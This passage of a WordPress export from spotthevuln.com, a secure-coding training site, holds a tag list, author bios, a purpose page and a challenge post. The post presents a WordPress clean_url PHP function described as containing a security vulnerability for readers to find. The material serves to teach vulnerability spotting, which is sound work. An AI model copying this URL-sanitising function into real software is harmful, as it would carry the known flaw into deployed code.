	<wp:tag><wp:term_id>62</wp:term_id><wp:tag_slug>protection-mechanisms</wp:tag_slug><wp:tag_name><![CDATA[protection mechanisms]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>175</wp:term_id><wp:tag_slug>punbb-2</wp:tag_slug><wp:tag_name><![CDATA[punbb]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>110</wp:term_id><wp:tag_slug>query-sql</wp:tag_slug><wp:tag_name><![CDATA[query sql]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>85</wp:term_id><wp:tag_slug>query-string</wp:tag_slug><wp:tag_name><![CDATA[query string]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>72</wp:term_id><wp:tag_slug>querystring</wp:tag_slug><wp:tag_name><![CDATA[querystring]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>156</wp:term_id><wp:tag_slug>red-flags</wp:tag_slug><wp:tag_name><![CDATA[red flags]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>198</wp:term_id><wp:tag_slug>referer-field</wp:tag_slug><wp:tag_name><![CDATA[referer field]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>42</wp:term_id><wp:tag_slug>register_globals</wp:tag_slug><wp:tag_name><![CDATA[register_globals]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>73</wp:term_id><wp:tag_slug>regular-expression</wp:tag_slug><wp:tag_name><![CDATA[regular expression]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>153</wp:term_id><wp:tag_slug>request-body</wp:tag_slug><wp:tag_name><![CDATA[request body]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>96</wp:term_id><wp:tag_slug>request-password</wp:tag_slug><wp:tag_name><![CDATA[request password]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>159</wp:term_id><wp:tag_slug>request-uri</wp:tag_slug><wp:tag_name><![CDATA[request uri]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>94</wp:term_id><wp:tag_slug>request-url</wp:tag_slug><wp:tag_name><![CDATA[request url]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>90</wp:term_id><wp:tag_slug>request-username</wp:tag_slug><wp:tag_name><![CDATA[request username]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>100</wp:term_id><wp:tag_slug>return-url</wp:tag_slug><wp:tag_name><![CDATA[return url]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>179</wp:term_id><wp:tag_slug>rfc-821</wp:tag_slug><wp:tag_name><![CDATA[rfc 821]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>167</wp:term_id><wp:tag_slug>rigorous-security</wp:tag_slug><wp:tag_name><![CDATA[rigorous security]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>171</wp:term_id><wp:tag_slug>root-cause-analysis</wp:tag_slug><wp:tag_name><![CDATA[root cause analysis]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>51</wp:term_id><wp:tag_slug>sanitization</wp:tag_slug><wp:tag_name><![CDATA[sanitization]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>79</wp:term_id><wp:tag_slug>sdk</wp:tag_slug><wp:tag_name><![CDATA[sdk]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>89</wp:term_id><wp:tag_slug>search-parameter</wp:tag_slug><wp:tag_name><![CDATA[search parameter]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>113</wp:term_id><wp:tag_slug>security-code</wp:tag_slug><wp:tag_name><![CDATA[security code]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>82</wp:term_id><wp:tag_slug>security-fixes</wp:tag_slug><wp:tag_name><![CDATA[security fixes]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>53</wp:term_id><wp:tag_slug>security-flaws</wp:tag_slug><wp:tag_name><![CDATA[security flaws]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>57</wp:term_id><wp:tag_slug>security-software</wp:tag_slug><wp:tag_name><![CDATA[security software]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>64</wp:term_id><wp:tag_slug>sensitive-data</wp:tag_slug><wp:tag_name><![CDATA[sensitive data]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>92</wp:term_id><wp:tag_slug>setup-mode</wp:tag_slug><wp:tag_name><![CDATA[setup mode]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>184</wp:term_id><wp:tag_slug>short-url</wp:tag_slug><wp:tag_name><![CDATA[short url]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>29</wp:term_id><wp:tag_slug>simple</wp:tag_slug><wp:tag_name><![CDATA[Simple]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>181</wp:term_id><wp:tag_slug>smtp-commands</wp:tag_slug><wp:tag_name><![CDATA[smtp commands]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>178</wp:term_id><wp:tag_slug>smtp-message</wp:tag_slug><wp:tag_name><![CDATA[smtp message]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>182</wp:term_id><wp:tag_slug>socket-connection</wp:tag_slug><wp:tag_name><![CDATA[socket connection]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>124</wp:term_id><wp:tag_slug>source-code</wp:tag_slug><wp:tag_name><![CDATA[source code]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>17</wp:term_id><wp:tag_slug>sql-injection</wp:tag_slug><wp:tag_name><![CDATA[SQL Injection]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>187</wp:term_id><wp:tag_slug>sql-queries</wp:tag_slug><wp:tag_name><![CDATA[sql queries]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>192</wp:term_id><wp:tag_slug>sql-query</wp:tag_slug><wp:tag_name><![CDATA[sql query]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>132</wp:term_id><wp:tag_slug>sql-statement</wp:tag_slug><wp:tag_name><![CDATA[sql statement]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>83</wp:term_id><wp:tag_slug>sql-statements</wp:tag_slug><wp:tag_name><![CDATA[sql statements]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>106</wp:term_id><wp:tag_slug>sql-string</wp:tag_slug><wp:tag_name><![CDATA[sql string]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>35</wp:term_id><wp:tag_slug>sqli</wp:tag_slug><wp:tag_name><![CDATA[SQLi]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>99</wp:term_id><wp:tag_slug>static-string</wp:tag_slug><wp:tag_name><![CDATA[static string]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>120</wp:term_id><wp:tag_slug>stefano-di-paola</wp:tag_slug><wp:tag_name><![CDATA[stefano di paola]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>84</wp:term_id><wp:tag_slug>string-parameters</wp:tag_slug><wp:tag_name><![CDATA[string parameters]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>95</wp:term_id><wp:tag_slug>string-password</wp:tag_slug><wp:tag_name><![CDATA[string password]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>93</wp:term_id><wp:tag_slug>string-url</wp:tag_slug><wp:tag_name><![CDATA[string url]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>91</wp:term_id><wp:tag_slug>string-username</wp:tag_slug><wp:tag_name><![CDATA[string username]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>103</wp:term_id><wp:tag_slug>stringutils</wp:tag_slug><wp:tag_name><![CDATA[stringutils]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>131</wp:term_id><wp:tag_slug>stripslashes</wp:tag_slug><wp:tag_name><![CDATA[stripslashes]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>22</wp:term_id><wp:tag_slug>strip_tags</wp:tag_slug><wp:tag_name><![CDATA[strip_tags]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>189</wp:term_id><wp:tag_slug>svg-xml</wp:tag_slug><wp:tag_name><![CDATA[svg xml]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>123</wp:term_id><wp:tag_slug>swf-file</wp:tag_slug><wp:tag_name><![CDATA[swf file]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>125</wp:term_id><wp:tag_slug>swf-files</wp:tag_slug><wp:tag_name><![CDATA[swf files]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>142</wp:term_id><wp:tag_slug>switch-cases</wp:tag_slug><wp:tag_name><![CDATA[switch cases]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>149</wp:term_id><wp:tag_slug>switch-statement</wp:tag_slug><wp:tag_name><![CDATA[switch statement]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>31</wp:term_id><wp:tag_slug>template</wp:tag_slug><wp:tag_name><![CDATA[template]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>137</wp:term_id><wp:tag_slug>test</wp:tag_slug><wp:tag_name><![CDATA[test]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>157</wp:term_id><wp:tag_slug>test-cases</wp:tag_slug><wp:tag_name><![CDATA[test cases]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>138</wp:term_id><wp:tag_slug>testing-and-debugging</wp:tag_slug><wp:tag_name><![CDATA[testing and debugging]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>75</wp:term_id><wp:tag_slug>text-javascript</wp:tag_slug><wp:tag_name><![CDATA[text javascript]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>47</wp:term_id><wp:tag_slug>token-validation</wp:tag_slug><wp:tag_name><![CDATA[token validation]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>52</wp:term_id><wp:tag_slug>type-sql</wp:tag_slug><wp:tag_name><![CDATA[type sql]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>98</wp:term_id><wp:tag_slug>url-parameter</wp:tag_slug><wp:tag_name><![CDATA[url parameter]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>50</wp:term_id><wp:tag_slug>validation-code</wp:tag_slug><wp:tag_name><![CDATA[validation code]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>56</wp:term_id><wp:tag_slug>vulnerabilities</wp:tag_slug><wp:tag_name><![CDATA[vulnerabilities]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>146</wp:term_id><wp:tag_slug>vulnerability</wp:tag_slug><wp:tag_name><![CDATA[vulnerability]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>169</wp:term_id><wp:tag_slug>web-application</wp:tag_slug><wp:tag_name><![CDATA[web application]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>13</wp:term_id><wp:tag_slug>wordpress</wp:tag_slug><wp:tag_name><![CDATA[Wordpress]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>107</wp:term_id><wp:tag_slug>wordpress-plugin</wp:tag_slug><wp:tag_name><![CDATA[wordpress plugin]]></wp:tag_name></wp:tag>
	<wp:term><wp:term_id>118</wp:term_id><wp:term_taxonomy>avhec_catgroup</wp:term_taxonomy><wp:term_slug>all</wp:term_slug><wp:term_parent></wp:term_parent><wp:term_name><![CDATA[All]]></wp:term_name><wp:term_description><![CDATA[Holds all the categories.]]></wp:term_description></wp:term>
	<wp:term><wp:term_id>119</wp:term_id><wp:term_taxonomy>avhec_catgroup</wp:term_taxonomy><wp:term_slug>home</wp:term_slug><wp:term_parent></wp:term_parent><wp:term_name><![CDATA[Home]]></wp:term_name><wp:term_description><![CDATA[This group will be shown on the front page.]]></wp:term_description></wp:term>
	<wp:term><wp:term_id>117</wp:term_id><wp:term_taxonomy>avhec_catgroup</wp:term_taxonomy><wp:term_slug>none</wp:term_slug><wp:term_parent></wp:term_parent><wp:term_name><![CDATA[none]]></wp:term_name><wp:term_description><![CDATA[This group will not show the widget.]]></wp:term_description></wp:term>
	<wp:term><wp:term_id>116</wp:term_id><wp:term_taxonomy>nav_menu</wp:term_taxonomy><wp:term_slug>blah</wp:term_slug><wp:term_name><![CDATA[Blah]]></wp:term_name></wp:term>

	<generator>http://wordpress.org/?v=3.3.1</generator>

	<item>
		<title>About Us</title>
		<link>http://spotthevuln.com/about-spot-the-vuln/</link>
		<pubDate>Thu, 10 Sep 2009 19:28:07 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http:/?page_id=2</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Brett Hardin</h1>
<img class="size-full wp-image-19 alignright" title="Brett Hardin" src="http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/3596647234_f01d17ef1b_m.jpg" alt="Brett Hardin" width="177" height="240" /> Brett Hardin is a security professional who has been in the industry for 15+ years. Brett founded <a href="http://sourceninja.com">SourceNinja</a> and is currently working to help people keep their open source updated. Brett has previously worked for Ernst &amp; Young’s Advanced Security Center as a penetration tester.

Brett holds a Bachelor’s Degree in Computer Science from California State University at Chico and is also a co-author of <a href="http://www.amazon.com/gp/product/0596154577/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=breharsblo-20&linkCode=as2&camp=1789&creative=9325&creativeASIN=0596154577">Hacking: The Next Generation</a>.

Brett's main focus is to bring security awareness to the general population. He believes the more educated users are, the better protected we will all be. Brett writes about these topics at <a href="http://misc-security.com">misc-security.com</a>.

Feel free to reach out to him on <a href="http://twitter.com/miscsecurity" target="_blank">Twitter</a>
<h1>Billy Rios</h1>
Billy Rios is currently a Security Engineer for a Major Software firm that everyone LOVES. Billy helps secure software used by people all over the world. Before Billy's current role as a Security Engineer, He was a Senior Security Consultant for VeriSign. Billy performed network, application, web-application, source-code, wireless, Internet, Intranet, dial-up, and social engineering security reviews and security architecture design services for various clients in the Fortune 500. <img class="size-medium wp-image-20 alignleft" title="React-Team-Leader" src="http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/React-Team-Leader-300x272.jpg" alt="React-Team-Leader" width="300" height="272" />Most importantly, he helps clients understand the existing and emerging security risks that their businesses face so that they can make an informed business decision.

Prior to joining VeriSign, Billy worked as a penetration tester for E&amp;Y’s Advanced Security Center, breaking into information systems and helping clients in the Fortune 500 understand existing and emerging security risks.

Before his life as a consultant, Billy helped defend Department of Defense networks as an Intrusion Detection Analyst. Billy looked at packets, monitored for suspicious network activity, took apart malicious code, and formally reported network and security incidents of all shapes and sizes. The crew he worked with at the CERT are some of the sharpest, most creative problem solvers he has ever met and many of them helped shape my perception of information security. Before attacking and defending networks, Billy was an active duty Marine Officer (Semper FI!). He spent some time in a hot desert, carried a side arm (sometimes a machine gun), and got real up-close and personal with physical and operational security.

Billy has an undergraduate degree in Business (with a formal concentration in Information Systems) from the University of Washington (GO HUSKIES!) and a Master of Science Degree in Information Systems (with Distinction) from Hawaii Pacific University. Billy recently completed his MBA to help balance out his geeky tendencies.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2</wp:post_id>
		<wp:post_date>2009-09-10 12:28:07</wp:post_date>
		<wp:post_date_gmt>2009-09-10 19:28:07</wp:post_date_gmt>
		<wp:comment_status>closed</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>about-spot-the-vuln</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>1</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sociableoff</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_page_template</wp:meta_key>
			<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Security Professionals]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Biographies of the security professionals behind spotthevuln.com]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>Hide SexyBookmarks</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>Hide OgTags</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_srslide_disable_on_post</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_srslide_title</wp:meta_key>
			<wp:meta_value><![CDATA[About Us]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_srslide_tags</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Purpose</title>
		<link>http://spotthevuln.com/purpose/</link>
		<pubDate>Thu, 10 Sep 2009 23:37:00 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?page_id=16</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>What is the Purpose of spotthevuln.com</h2>
Spotthevuln.com was designed to give developers more insight into designing code with security in mind.

When developers write source code they rarely think about security.

After insecure code is deployed, one of two things can happen.
<ol>
	<li>The bug can be found, in which case the developers have to <strong>waste development time</strong> in order to rewrite their solutions.</li>
	<li>The vulnerability is exploited, and the organization <strong>loses money, consumer trust, and can gain a negative reputation</strong> to their brand.</li>
</ol>
These problems can be avoided if the developers wrote the code correctly (securely) the first time.

Spotthevuln.com can aid developers, development managers, and QA staff by helping them sharpen their skills in spotting vulnerabilities in source code.

Spotthevuln.com use actual code snippets from open source applications to demonstrate how often vulnerable pieces of code get deployed into the real world.

The purpose is simple:
<ul>
	<li> Every <strong>Monday a vulnerable piece of code</strong> is posted.</li>
	<li> Every <strong>Friday the solution</strong> is posted.</li>
</ul>
On Monday, look at the piece of the code to see if you can identify what the security vulnerability is. Like everything else being able to spot vulnerable code takes practice.

Doing this exercise should take between 5 and 10 minutes out of your day. Do it while you drink your morning coffee and you will already be on your way to being able to write more secure applications.

<span style="text-decoration: underline;"><strong>The more secure code is, the better off we will all be.</strong></span>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>16</wp:post_id>
		<wp:post_date>2009-09-10 16:37:00</wp:post_date>
		<wp:post_date_gmt>2009-09-10 23:37:00</wp:post_date_gmt>
		<wp:comment_status>closed</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>purpose</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:postmeta>
			<wp:meta_key>syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sociableoff</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_page_template</wp:meta_key>
			<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Finding Security Vulnerabilities]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[What is the Purpose of spotthevuln.]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Brett Hardin</title>
		<link>http://spotthevuln.com/about-spot-the-vuln/3596647234_f01d17ef1b_m/</link>
		<pubDate>Thu, 10 Sep 2009 23:37:44 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/3596647234_f01d17ef1b_m.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>19</wp:post_id>
		<wp:post_date>2009-09-10 16:37:44</wp:post_date>
		<wp:post_date_gmt>2009-09-10 23:37:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>3596647234_f01d17ef1b_m</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>2</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/3596647234_f01d17ef1b_m.jpg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2009/09/3596647234_f01d17ef1b_m.jpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"177";s:6:"height";s:3:"240";s:14:"hwstring_small";s:22:"height='96' width='70'";s:4:"file";s:35:"2009/09/3596647234_f01d17ef1b_m.jpg";s:5:"sizes";a:1:{s:9:"thumbnail";a:3:{s:4:"file";s:35:"3596647234_f01d17ef1b_m-150x150.jpg";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>React-Team-Leader</title>
		<link>http://spotthevuln.com/about-spot-the-vuln/react-team-leader/</link>
		<pubDate>Thu, 10 Sep 2009 23:40:18 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/React-Team-Leader.JPG</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>20</wp:post_id>
		<wp:post_date>2009-09-10 16:40:18</wp:post_date>
		<wp:post_date_gmt>2009-09-10 23:40:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>react-team-leader</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>2</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://spotthevuln.com/wordpress/wp-content/uploads/2009/09/React-Team-Leader.JPG</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2009/09/React-Team-Leader.JPG]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"450";s:6:"height";s:3:"409";s:14:"hwstring_small";s:23:"height='96' width='105'";s:4:"file";s:29:"2009/09/React-Team-Leader.JPG";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:4:"file";s:29:"React-Team-Leader-150x150.jpg";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:29:"React-Team-Leader-300x272.jpg";s:5:"width";s:3:"300";s:6:"height";s:3:"272";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>These Pipes are Clean</title>
		<link>http://spotthevuln.com/2009/09/vulnerable-code-these-pipes-are-clean/</link>
		<pubDate>Mon, 21 Sep 2009 15:00:41 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=157</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>I believe that professional wrestling is clean and everything else in the world is fixed.
- Frank Deford</blockquote>
The code snippet shown below has a security vulnerability.

<strong>Can you spot the vulnerability in this piece of code?</strong> If so, feel free to leave a comment. None of the comments will be shown until Friday, to prevent spoilers.

If you are a <a href="http://spotthevuln.com/using-spot-the-vuln/#dev-manager">development manager</a> or an <a href="http://spotthevuln.com/using-spot-the-vuln/#instructor">instructor</a> you can integrate these security source code challenges into your development program or your curriculum.
<h2>Vulnerable Code Snippet</h2>
[ccnLe_php]

function clean_url( $url, $protocols = null, $context = 'display' ) {
$original_url = $url;

if ('' == $url) return $url;
$url = preg_replace('|[^a-z0-9-~+_.?#=!&amp;;,/:%@$\|*\'()\\x80-\\xff]|i', '', $url);
$strip = array('%0d', '%0a');
$url = str_replace($strip, '', $url);
$url = str_replace(';//', '://', $url);
/* If the URL doesn't appear to contain a scheme, we
* presume it needs http:// appended (unless a relative
* link starting with / or a php file).
*/
if ( strpos($url, ':') === false &amp;&amp;
substr( $url, 0, 1 ) != '/' &amp;&amp; substr( $url, 0, 1 ) != '#' &amp;&amp; !preg_match('/^[a-z0-9-]+?\.php/i', $url) )
$url = 'http://' . $url;

// Replace ampersands and single quotes only when displaying.
if ( 'display' == $context ) {
$url = preg_replace('/&amp;([^#])(?![a-z]{2,8};)/', '&amp;$1', $url);
$url = str_replace( "'", '', $url );
}

if ( !is_array($protocols) )
$protocols = array('http', 'https', 'ftp', 'ftps', 'mailto', 'news', 'irc', 'gopher', 'nntp', 'feed', 'telnet');
if ( wp_kses_bad_protocol( $url, $protocols ) != $url )
return '';

return apply_filters('clean_url', $url, $original_url, $context);
}

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>157</wp:post_id>
		<wp:post_date>2009-09-21 08:00:41</wp:post_date>
		<wp:post_date_gmt>2009-09-21 15:00:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-these-pipes-are-clean</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_aioseop_description</wp:meta_key>
			<wp:meta_value><![CDATA[What's wrong with this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aioseop_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable PHP Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
